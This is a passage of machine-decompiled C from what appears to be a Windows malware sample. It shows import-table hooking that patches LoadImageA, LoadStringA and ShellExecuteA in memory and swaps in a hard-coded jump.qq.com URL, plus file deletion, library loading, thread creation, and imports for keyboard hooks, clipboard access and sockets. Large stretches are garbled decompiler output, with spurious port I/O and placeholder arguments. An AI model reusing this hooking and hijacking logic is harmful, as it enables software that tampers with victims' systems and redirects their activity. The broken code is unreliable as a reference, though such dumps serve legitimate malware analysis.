            int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)*(int32_t *)(v1 + 4)); // 0x407f47
            v3 = moduleHandle;
            if (*v2 == moduleHandle) {
                // 0x407f51
                v3 = function_407f74(*v4);
            }
        }
    }
    int32_t result = v3; // 0x407f68
    int32_t v5; // 0x407f2c
    if ((char)v5 >= 1) {
        // 0x407f6a
        result = function_402b40();
    }
    // 0x407f71
    return result;
}

// Address range: 0x407f74 - 0x40802a
int32_t function_407f74(int32_t a1) {
    // 0x407f74
    int32_t result; // 0x407f74
    if (a1 == 0 || a1 <= -1) {
        // 0x408021
        return result;
    }
    int32_t v1 = a1; // bp-52, 0x407fa5
    int32_t v2; // 0x407f74
    int32_t v3; // 0x407f74
    int32_t v4; // 0x407f74
    int32_t * v5 = ImageDirectoryEntryToData((int32_t *)v2, (char)v3, (int16_t)v4, &g111); // 0x407fa6
    int32_t result2 = (int32_t)v5; // 0x407fa6
    if (v5 == NULL) {
        // 0x408021
        return result2;
    }
    int32_t result3 = *(int32_t *)(result2 + 12); // 0x40801a
    if (result3 == 0) {
        // 0x408021
        return result3;
    }
    // 0x407fb3
    int32_t v6; // bp-24, 0x407f74
    int32_t v7 = &v6;
    int32_t v8 = result3; // 0x40801a
    int32_t v9 = result2; // 0x407f74
    int32_t v10 = &v1; // 0x407f74
    while (true) {
        int32_t v11 = v10;
        int32_t v12 = v9;
        *(int32_t *)(v11 - 4) = 0x1000000 * v3 / 0x1000000;
        int32_t v13 = v11 - 8; // 0x407fbc
        *(int32_t *)v13 = v8 + a1;
        int32_t v14 = lstrcmpiA((char *)&g111, (char *)&g111); // 0x407fbd
        v10 = v13;
        if (v14 == 0) {
            int32_t v15 = *(int32_t *)(v12 + 16) + a1; // 0x407fc9
            int32_t v16 = *(int32_t *)v15; // 0x408011
            int32_t v17 = v16; // 0x408015
            int32_t v18 = v15; // 0x408015
            v10 = v13;
            if (v16 != 0) {
                int32_t v19 = v18;
                while (v17 != 0x10000 * v4 / 0x10000) {
                    int32_t v20 = v19 + 4; // 0x40800e
                    int32_t v21 = *(int32_t *)v20; // 0x408011
                    v17 = v21;
                    v18 = v20;
                    v10 = v13;
                    if (v21 == 0) {
                        goto lab_0x408017;
                    }
                    v19 = v18;
                }
                // 0x407fd3
                int32_t v22; // bp-20, 0x407f74
                *(int32_t *)(v11 - 12) = (int32_t)&v22;
                *(int32_t *)(v11 - 16) = 128;
                *(int32_t *)(v11 - 20) = 4;
                *(int32_t *)(v11 - 24) = v19;
                VirtualProtect(&g111, (int32_t)&g111, (int32_t)&g111, &g111);
                *(int32_t *)(v11 - 28) = v7;
                *(int32_t *)(v11 - 32) = 4;
                int32_t v23; // 0x407f74
                *(int32_t *)(v11 - 36) = (int32_t)&v23;
                *(int32_t *)(v11 - 40) = v19;
                *(int32_t *)(v11 - 44) = (int32_t)GetCurrentProcess();
                WriteProcessMemory(&g111, &g111, &g111, (int32_t)&g111, &g111);
                *(int32_t *)(v11 - 48) = v7;
                *(int32_t *)(v11 - 52) = v22;
                *(int32_t *)(v11 - 56) = 4;
                int32_t v24 = v11 - 60; // 0x408006
                *(int32_t *)v24 = v19;
                VirtualProtect(&g111, (int32_t)&g111, (int32_t)&g111, &g111);
                v10 = v24;
            }
        }
      lab_0x408017:
        // 0x408017
        v8 = *(int32_t *)(v12 + 32);
        v9 = v12 + 20;
        result = v8;
        if (v8 == 0) {
            // break -> 0x408021
            break;
        }
    }
    // 0x408021
    return result;
}

// Address range: 0x40802c - 0x408030
int32_t function_40802c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40802c
    int32_t v1; // 0x40802c
    return *(int32_t *)(v1 + 24);
}

// Address range: 0x408030 - 0x408041
int32_t function_408030(void) {
    // 0x408030
    return function_4033c4();
}

// Address range: 0x408047 - 0x40811b
int32_t function_408047(int32_t a1, int32_t a2, int32_t a3) {
    // 0x408047
    int32_t v1; // 0x408047
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x40804a
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x4080b4
        __writefsdword(0, a3);
        return 0;
    }
    // 0x40804e
    int32_t v4; // 0x408047
    int16_t v5 = v4; // 0x40806c
    int32_t v6; // 0x408047
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x408047
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x408072
    int32_t v9; // 0x408047
    char * v10 = (char *)v9; // 0x408072
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x408077
    int64_t v12 = 103 * v11; // 0x408077
    int32_t v13 = v12; // 0x408077
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x40807c
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x408081
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x4080ec
        unsigned char v17 = v16 + v2; // 0x4080ec
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x4080f0
            return function_408030();
        }
        // 0x408105
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x408122;
        return function_403370();
    }
    // 0x408086
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x40808b
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x40809c
    int32_t * v20 = (int32_t *)v19; // 0x40809c
    int32_t v21 = *v20; // 0x40809c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x4080a2
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x4080c9;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x40811b - 0x408120
int32_t function_40811b(void) {
    // 0x40811b
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x408120 - 0x408122
int32_t function_408120(void) {
    // 0x408120
    int32_t result; // 0x408120
    return result;
}

// Address range: 0x408122 - 0x408125
int32_t function_408122(int32_t a1, int32_t a2) {
    // 0x408122
    int32_t result; // 0x408122
    return result;
}

// Address range: 0x408128 - 0x408174
int32_t function_408128(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x408128
    int32_t v1; // 0x408128
    int32_t v2; // 0x408128
    int32_t v3; // 0x408128
    return function_40802c(v2, v3, v1, a1, a2);
}

// Address range: 0x408174 - 0x4081a3
int32_t function_408174(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x408174
    int32_t v1; // 0x408174
    return function_40802c(v1, a1, a2, a3 != 2975 ? a3 : 2974, a4);
}

// Address range: 0x4081a4 - 0x40823c
int32_t function_4081a4(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x4081bb
    __writefsdword(0, (int32_t)&v1);
    function_403474();
    int32_t v2 = function_40380c() < 1 ? a4 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_403474();
    int32_t v3 = function_40380c() < 1 ? a3 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_40802c(a1, a2, v3, v2, a5);
    __writefsdword(0, a6);
    return function_403394();
}

// Address range: 0x40823c - 0x408241
int32_t function_40823c(void) {
    // 0x40823c
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x408241 - 0x408243
int32_t function_408241(void) {
    // 0x408241
    int32_t result; // 0x408241
    return result;
}

// Address range: 0x408243 - 0x40824d
int32_t function_408243(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x408243
    int32_t result; // 0x408243
    return result;
}

// Address range: 0x408253 - 0x408255
int32_t function_408253(void) {
    // 0x408253
    int32_t result; // 0x408253
    return result;
}

// Address range: 0x4082a0 - 0x408310
int32_t function_4082a0(void) {
    // 0x4082a0
    g30 = function_407ea0("user32.dll", "LoadImageA", 0x408128);
    g31 = function_407ea0("user32.dll", "LoadStringA", 0x408174);
    int32_t result = function_407ea0("shell32.dll", "ShellExecuteA", 0x4081a4); // 0x408305
    g32 = result;
    return result;
}

// Address range: 0x408310 - 0x408487
int32_t function_408310(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14) {
    // 0x408310
    int32_t result; // 0x408310
    bool v1; // 0x408310
    if (!v1) {
        // 0x408385
        return result;
    }
    int32_t result2; // 0x408310
    int32_t v2; // 0x408310
    int32_t v3; // 0x408310
    uint32_t v4; // 0x408310
    bool v5; // 0x408310
    if (!v5) {
        int16_t v6 = v4; // 0x408317
        char v7 = __asm_insb(v6); // 0x408317
        char * v8 = (char *)v2; // 0x408317
        *v8 = v7;
        *v8 = __asm_insb(v6);
        int32_t v9 = result2;
        *(char *)v9 = *(char *)&result2 + (char)v9;
        __asm_outsd(v6, v3);
        int32_t v10; // 0x408310
        *(int32_t *)v10 = __asm_insd((int16_t)a10);
        result2 = a1;
        char * v11 = (char *)a1; // 0x408326
        char v12 = a1; // 0x408326
        *v11 = *v11 + v12;
        __asm_outsd((int16_t)a3, *(int32_t *)a6);
        *v11 = *v11 + v12;
        char * v13 = (char *)(a7 + 97 + 0x5cd8e4e8 * *(int32_t *)(a5 + 67 & 0xffff)); // 0x408337
        *v13 = (char)a2 + 1 + *v13;
        return result2;
    }
    // 0x408348
    int32_t v14; // 0x408310
    int32_t v15 = v14 ^ 256 * v3 & 0xff00; // 0x408348
    *(char *)result = 2 * (char)result;
    int32_t v16; // 0x408310
    int32_t v17 = v16 + 104; // 0x40834f
    char * v18 = (char *)v17; // 0x40834f
    *v18 = *v18 + (char)(v4 / 256);
    int16_t v19 = v4; // 0x408352
    char v20 = __asm_insb(v19); // 0x408352
    char * v21 = (char *)v2; // 0x408352
    *v21 = v20;
    *v21 = __asm_insb(v19);
    int32_t v22 = v4 ^ v3; // 0x408355
    *v21 = __asm_insb(v19);
    *v21 = __asm_insb(v19);
    unsigned char v23 = *v18; // 0x40835b
    char v24 = v4; // 0x40835b
    unsigned char v25 = v23 + v24; // 0x40835b
    *v18 = v25;
    *v21 = __asm_insb(v19);
    *v21 = __asm_insb(v19);
    int32_t v26; // 0x408310
    if (v26 >= 0xffffffff) {
        // 0x408364
        __asm_arpl(*(int16_t *)(v26 + 117), (int16_t)v22);
        int32_t v27 = result2;
        *(char *)v27 = *(char *)&result2 + (char)v27;
        char * v28 = (char *)(v15 + 82); // 0x40836b
        *v28 = *v28 + v24;
        uint32_t result3 = result2 - 1; // 0x40836e
        char * v29 = (char *)(v15 + 0x40910d); // 0x40837b
        *v29 = *v29 + (char)(result3 / 256);
        return result3;
    }
    if (v25 >= v23) {
        // 0x408439
        return result2;
    }
    // 0x4083cb
    __asm_outsb(v19, *(char *)v22);
    __readfsdword(v15 + 115);
    *v21 = __asm_insb(v19);
    int64_t v30 = (int64_t)*(int32_t *)(v17 & 0xffff); // 0x4083e3
    int64_t v31 = 103 * v30; // 0x4083e3
    int32_t v32 = v31; // 0x4083e3
    int32_t * v33 = (int32_t *)(v32 - 4); // 0x4083e8
    *v33 = 0x6b64736b;
    int32_t v34 = v32 - 8; // 0x4083ed
    int32_t * v35 = (int32_t *)v34; // 0x4083ed
    *v35 = 97;
    *v21 = __asm_insb(v19);
    if (v31 == 0x6700000000 * v30 / 0x100000000) {
        char * v36 = (char *)v15; // 0x408458
        unsigned char v37 = *v36; // 0x408458
        unsigned char v38 = v37 + (char)result2; // 0x408458
        *v36 = v38;
        if (v38 < v37) {
            // 0x40845c
            return function_4033c4();
        }
        // 0x408471
        __writefsdword(0, *v35);
        *(int32_t *)v32 = 0x40848e;
        return function_403370();
    }
    // 0x4083f2
    *(int32_t *)(v32 - 12) = 0x666a6766;
    int32_t * v39 = (int32_t *)(v32 - 16); // 0x4083f7
    *v39 = 107;
    *(int32_t *)(v32 - 20) = 97;
    *v21 = __asm_insb(v19);
    *(int32_t *)(v32 - 24) = 97;
    int32_t v40 = v32 + 4; // 0x408408
    int32_t * v41 = (int32_t *)v40; // 0x408408
    int32_t v42 = *v41; // 0x408408
    *(char *)97 = __asm_insb((int16_t)*v33);
    char * v43 = (char *)v42; // 0x40840e
    *v43 = *v43 + (char)v42;
    *v41 = *v39;
    int32_t * v44 = (int32_t *)v32; // 0x408415
    *v44 = v40;
    *v33 = 0x408435;
    *v35 = __readfsdword(0);
    __writefsdword(0, v34);
    g108++;
    result2 = 0;
    __writefsdword(0, *v35);
    *v44 = 0x40843c;
    return result2;
}

// Address range: 0x408487 - 0x40848c
int32_t function_408487(void) {
    // 0x408487
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40848c - 0x40848e
int32_t function_40848c(void) {
    // 0x40848c
    int32_t result; // 0x40848c
    return result;
}

// Address range: 0x40848e - 0x408491
int32_t function_40848e(int32_t a1, int32_t a2) {
    // 0x40848e
    int32_t result; // 0x40848e
    return result;
}

// Address range: 0x408494 - 0x4084a5
int32_t function_408494(void) {
    // 0x408494
    return function_4033c4();
}

// Address range: 0x4084ab - 0x40857f
int32_t function_4084ab(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4084ab
    int32_t v1; // 0x4084ab
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x4084ae
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x408518
        __writefsdword(0, a3);
        return 0;
    }
    // 0x4084b2
    int32_t v4; // 0x4084ab
    int16_t v5 = v4; // 0x4084d0
    int32_t v6; // 0x4084ab
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x4084ab
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x4084d6
    int32_t v9; // 0x4084ab
    char * v10 = (char *)v9; // 0x4084d6
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x4084db
    int64_t v12 = 103 * v11; // 0x4084db
    int32_t v13 = v12; // 0x4084db
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x4084e0
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x4084e5
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x408550
        unsigned char v17 = v16 + v2; // 0x408550
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x408554
            return function_408494();
        }
        // 0x408569
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x408586;
        return function_403370();
    }
    // 0x4084ea
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x4084ef
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x408500
    int32_t * v20 = (int32_t *)v19; // 0x408500
    int32_t v21 = *v20; // 0x408500
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x408506
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x40852d;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x40857f - 0x408584
int32_t function_40857f(void) {
    // 0x40857f
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x408584 - 0x408586
int32_t function_408584(void) {
    // 0x408584
    int32_t result; // 0x408584
    return result;
}

// Address range: 0x408586 - 0x408589
int32_t function_408586(int32_t a1, int32_t a2) {
    // 0x408586
    int32_t result; // 0x408586
    return result;
}

// Address range: 0x40858c - 0x408596
int32_t function_40858c(void) {
    // 0x40858c
    int32_t result; // 0x40858c
    return result;
}

// Address range: 0x408598 - 0x4085b7
int32_t function_408598(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4085a3
    __writefsdword(0, (int32_t)&v1);
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4085b7 - 0x4085bc
int32_t function_4085b7(void) {
    // 0x4085b7
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4085bc - 0x4085be
int32_t function_4085bc(void) {
    // 0x4085bc
    int32_t result; // 0x4085bc
    return result;
}

// Address range: 0x4085be - 0x4085c0
int32_t function_4085be(int32_t a1) {
    // 0x4085be
    int32_t result; // 0x4085be
    return result;
}

// Address range: 0x4086c0 - 0x408951
int32_t function_4086c0(void) {
    // 0x4086c0
    int32_t v1; // 0x4086c0
    function_4042bc(v1);
    int32_t v2 = __readfsdword(0); // bp-116, 0x4086fb
    __writefsdword(0, (int32_t)&v2);
    int32_t v3 = 0; // bp-128, 0x408707
    int32_t nameSize = GetModuleFileNameA((int32_t *)260, (char *)&g109, 0); // 0x408709
    *(char *)(nameSize + (int32_t)&g109) = 0;
    function_4034b0();
    function_40774c();
    function_4033c4();
    int32_t v4; // 0x4086c0
    int32_t v5; // 0x4086c0
    if ((char)function_4077c4() == 0) {
        int32_t v6 = &v3; // 0x408707
        function_4066f0();
        v5 = v6;
        if ((char)function_4077c4() == 0) {
            goto lab_0x408936;
        } else {
            // 0x4087e9
            *(int32_t *)g35 = -1;
            v4 = v6;
            goto lab_0x4087f4;
        }
    } else {
        // 0x40874c
        *(int32_t *)g34 = -1;
        function_4034b0();
        function_40778c();
        function_4033c4();
        function_403514();
        DeleteFileA((char *)function_4036c8());
        function_403514();
        char * lpLibFileName = (char *)function_4036c8(); // 0x4087ba
        char * v7 = lpLibFileName; // bp-136, 0x4087ba
        g33 = (int32_t)LoadLibraryA(lpLibFileName);
        v4 = (int32_t)&v7;
        goto lab_0x4087f4;
    }
  lab_0x408936:
    // 0x408936
    __writefsdword(0, *(int32_t *)v5);
    *(int32_t *)(v5 + 8) = 0x408958;
    return function_403394();
  lab_0x4087f4:
    // 0x4087f4
    *(int32_t *)(v4 - 4) = 260;
    *(int32_t *)(v4 - 8) = (int32_t)&g109;
    int32_t v8 = v4 - 12; // 0x4087ff
    *(int32_t *)v8 = (int32_t)g83;
    int32_t nameSize2 = GetModuleFileNameA(&g111, (char *)&g111, (int32_t)&g111); // 0x408800
    *(char *)(nameSize2 + (int32_t)&g109) = 0;
    function_4034b0();
    function_40778c();
    function_4033c4();
    function_403514();
    int32_t v9; // 0x4086c0
    if (g35 == 0) {
        // 0x40888d
        v5 = v8;
        if (g34 == 0) {
            goto lab_0x408936;
        } else {
            // 0x40889b
            if (*(char *)&g40 != 0) {
                // 0x4088a5
                function_406fec();
            }
            // 0x4088aa
            if (g38 >= 1) {
                // 0x4088b4
                function_404eb8();
                function_403614();
                *(int32_t *)g39 = -1;
                if (g39 != 0) {
                    // 0x4088e2
                    function_40654c();
                }
            }
            // 0x4088e7
            *(int32_t *)(v4 - 16) = 3;
            *(int32_t *)(v4 - 20) = 0x3ec1;
            int32_t v10 = v4 - 24; // 0x4088f3
            *(int32_t *)v10 = g33;
            int32_t * v11 = FindResourceA(&g111, (char *)&g111, (char *)&g111); // 0x4088f4
            v9 = v10;
            if (v11 != NULL) {
                goto lab_0x408927;
            } else {
                // 0x4088fd
                *(int32_t *)(v4 - 28) = 14;
                *(int32_t *)(v4 - 32) = 0x3ec1;
                int32_t v12 = v4 - 36; // 0x408909
                *(int32_t *)v12 = g33;
                int32_t * v13 = FindResourceA(&g111, (char *)&g111, (char *)&g111); // 0x40890a
                v9 = v12;
                if (v13 != NULL) {
                    goto lab_0x408927;
                } else {
                    // 0x408913
                    *(int32_t *)(v4 - 40) = 0x3ec1;
                    int32_t v14 = v4 - 44; // 0x40891d
                    *(int32_t *)v14 = g33;
                    int32_t * iconHandle = LoadIconA(&g111, (char *)&g111); // 0x40891e
                    v9 = v14;
                    v5 = v14;
                    if (iconHandle == NULL) {
                        goto lab_0x408936;
                    } else {
                        goto lab_0x408927;
                    }
                }
            }
        }
    } else {
        // 0x40885a
        *(int32_t *)(v4 - 16) = (int32_t)"xr, wo xiang ni";
        int32_t v15 = v4 - 20; // 0x40885f
        *(int32_t *)v15 = (int32_t)"ListBox";
        int32_t * v16 = FindWindowA((char *)&g111, (char *)&g111); // 0x408864
        v5 = v15;
        if (v16 == NULL) {
            // 0x408871
            *(int32_t *)(v4 - 24) = (int32_t)&g110;
            *(int32_t *)(v4 - 28) = 0;
            *(int32_t *)(v4 - 32) = 66;
            *(int32_t *)(v4 - 36) = 0x406d6c;
            *(int32_t *)(v4 - 40) = 0;
            int32_t v17 = v4 - 44; // 0x408881
            *(int32_t *)v17 = 0;
            CreateThread((struct _SECURITY_ATTRIBUTES *)&g111, (int32_t)&g111, (int32_t (*)(int32_t *))&g111, &g111, (int32_t)&g111, &g111);
            v5 = v17;
        }
        goto lab_0x408936;
    }
  lab_0x408927:
    // 0x408927
    function_4082a0();
    g84 = 0x40858c;
    v5 = v9;
    goto lab_0x408936;
}

// Address range: 0x408951 - 0x408956
int32_t function_408951(void) {
    // 0x408951
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x408956 - 0x408958
int32_t function_408956(void) {
    // 0x408956
    int32_t result; // 0x408956
    return result;
}

// Address range: 0x40f0ef - 0x40f138
int32_t entry_point(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x40f104
    __writefsdword(0, (int32_t)&v1);
    __writefsdword(0, v1);
    int32_t result = function_4086c0();
    char v2 = result; // 0x40f130
    char * v3 = (char *)result; // 0x40f130
    int32_t v4; // 0x40f0ef
    *v3 = v2 + (char)v4;
    int32_t v5; // 0x40f0ef
    *v3 = *(char *)&v5 + v2;
    *v3 = *(char *)&v5 + v2;
    *v3 = *(char *)&v5 + v2;
    return result;
}

// --------------- Dynamically Linked Functions ---------------

// LRESULT CallNextHookEx(_In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
// BOOL CloseClipboard(VOID);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int CompareStringA(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZCH lpString1, _In_ int cchCount1, PCNZCH lpString2, _In_ int cchCount2);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HWND CreateWindowExA(_In_ DWORD dwExStyle, _In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName, _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth, _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu, _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam);
// LRESULT DefWindowProcA(_In_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// LRESULT DispatchMessageA(_In_ const MSG * lpMsg);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL EnumWindows(_In_ WNDENUMPROC lpEnumFunc, _In_ LPARAM lParam);
// VOID ExitProcess(_In_ UINT uExitCode);
// int32_t ExitProcess2(void);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// HWND FindWindowExA(_In_opt_ HWND hWndParent, _In_opt_ HWND hWndChildAfter, _In_opt_ LPCSTR lpszClass, _In_opt_ LPCSTR lpszWindow);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// VOID FreeLibraryAndExitThread(_In_ HMODULE hLibModule, _In_ DWORD dwExitCode);
// BOOL GetCaretPos(_Out_ LPPOINT lpPoint);
// BOOL GetCharWidthA(_In_ HDC hdc, _In_ UINT iFirst, _In_ UINT iLast, LPINT lpBuffer);
// DWORD GetClassLongA(_In_ HWND hWnd, _In_ int nIndex);
// int GetClassNameA(_In_ HWND hWnd, LPSTR lpClassName, _In_ int nMaxCount);
// HANDLE GetClipboardData(_In_ UINT uFormat);
// LPSTR GetCommandLineA(VOID);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentThreadId(VOID);
// HDC GetDC(_In_opt_ HWND hWnd);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// BOOL GetKeyboardState(PBYTE lpKeyState);
// int GetKeyboardType(_In_ int nTypeFlag);
// int GetLocaleInfoA(_In_ LCID Locale, _In_ LCTYPE LCType, LPSTR lpLCData, _In_ int cchData);
// BOOL GetMessageA(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HWND GetParent(_In_ HWND hWnd);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HANDLE GetStdHandle(_In_ DWORD nStdHandle);
// HGDIOBJ GetStockObject(_In_ int i);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// LCID GetThreadLocale(void);
// DWORD GetTickCount(VOID);
// int32_t GetTickCount2(void);
// HWND GetTopWindow(_In_opt_ HWND hWnd);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// HWND GetWindow(_In_ HWND hWnd, _In_ UINT uCmd);
// LONG GetWindowLongA(_In_ HWND hWnd, _In_ int nIndex);
// DWORD GetWindowThreadProcessId(_In_ HWND hWnd, _Out_opt_ LPDWORD lpdwProcessId);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// LPVOID GlobalLock(_In_ HGLOBAL hMem);
// BOOL GlobalUnlock(_In_ HGLOBAL hMem);
// u_short htons(_In_ u_short hostshort);
// PVOID ImageDirectoryEntryToData(_In_ PVOID Base, _In_ BOOLEAN MappedAsImage, _In_ USHORT DirectoryEntry, _Out_ PULONG Size);
// char * inet_ntoa(_In_ struct in_addr in);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL IsWindow(_In_opt_ HWND hWnd);
// BOOL IsWindowVisible(_In_ HWND hWnd);
// BOOL KillTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR uIDEvent);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HICON LoadIconA(_In_opt_ HINSTANCE hInstance, _In_ LPCSTR lpIconName);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// int32_t LocalAlloc2(void);
// HLOCAL LocalFree(HLOCAL hMem);
// int32_t LocalFree2(void);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int MessageBoxA(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
// BOOL OpenClipboard(_In_opt_ HWND hWndNewOwner);
// BOOL PathFileExistsA(_In_ LPCSTR pszPath);
// BOOL PostMessageA(_In_opt_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID PostQuitMessage(_In_ int nExitCode);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// int32_t RegCloseKey2(void);
